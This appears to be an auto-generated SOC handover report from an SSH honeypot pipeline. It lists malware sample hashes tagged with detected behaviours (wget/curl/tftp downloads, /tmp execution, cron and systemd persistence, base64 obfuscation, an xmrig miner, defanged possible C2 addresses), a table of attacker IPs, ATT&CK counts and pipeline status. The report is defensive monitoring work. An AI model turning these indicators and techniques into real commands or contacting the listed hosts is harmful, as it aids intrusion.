_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `138.226.239[.]233` | NL | Vlad Cojuhari | **100** ⚠️ | 50 |
| `91.193.172[.]91` | UA | TOV KS PLUS | **100** ⚠️ | 4 |
| `201.79.23[.]140` | US | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `78.128.112[.]74` | BG | Lir.bg EOOD | **100** ⚠️ | 50 |
| `70.44.141[.]43` | US | PenTeleData House Account | **100** ⚠️ | 11 |
| `70.174.30[.]78` | US | Cox Communications | **100** ⚠️ | 4 |
| `121.146.233[.]245` | KR | Korea Telecom | **100** ⚠️ | 22 |
| `35.210.54[.]245` | BE | Google LLC | **100** ⚠️ | 11 |
| `195.178.110[.]78` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 8 |
| `139.84.162[.]21` | IN | Vultr Holdings, LLC | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 218 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 216 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 131 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 13 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 7 |

---

## 🔕 False Positive Summary (76 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 16 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 5 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 6 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 7 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 32 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 426 cases |
| Tool 34  | Credential Extractor        | ✅ 550 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 31 fingerprints |
| Tool 36  | Command Clustering          | ✅ 144 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 191 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 76 filtered (17.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 71 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 204 priority case(s) shown individually · 139 recon entry/entries in table (6 group(s) consolidating 13 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-22T18:50:04Z_
